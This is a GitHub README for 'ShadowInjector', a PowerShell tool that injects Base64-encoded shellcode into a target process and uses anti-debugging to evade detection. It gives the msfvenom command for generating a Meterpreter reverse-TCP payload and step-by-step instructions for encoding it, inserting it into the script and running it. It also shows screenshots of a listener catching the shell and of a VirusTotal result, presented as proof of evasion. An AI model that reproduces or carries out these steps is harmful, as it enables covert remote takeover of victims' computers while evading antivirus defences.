# ShadowInjector
A sophisticated PowerShell script that stealthily injects Base64-encoded shellcode into the target process, featuring anti-debugging techniques to evade detection.



## Running the Script
You can create the malicious payload as follows.

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=local_port -f csharp

![](https://github.com/okankurtuluss/ShadowInjector/blob/okankurtuluss/main/screenshots/Creating%20a%20payload.png)

Perform the encode process by pasting the created shellcode into the "# shellcode will be written here" section.
![](https://github.com/okankurtuluss/ShadowInjector/blob/okankurtuluss/main/screenshots/shellcode_encode.png)

Add the base64 encoded payload to the "add_shell_code_here" section of the script.

To run the script, open a PowerShell window and execute the following command:

.\ShadowInjector.ps1
![](https://github.com/okankurtuluss/ShadowInjector/blob/okankurtuluss/main/screenshots/Run%20Script.png)

![](https://github.com/okankurtuluss/ShadowInjector/blob/okankurtuluss/main/screenshots/Listening.png)

## Virustotal Result
![](https://github.com/okankurtuluss/ShadowInjector/blob/okankurtuluss/main/screenshots/virustotal%20result.png)


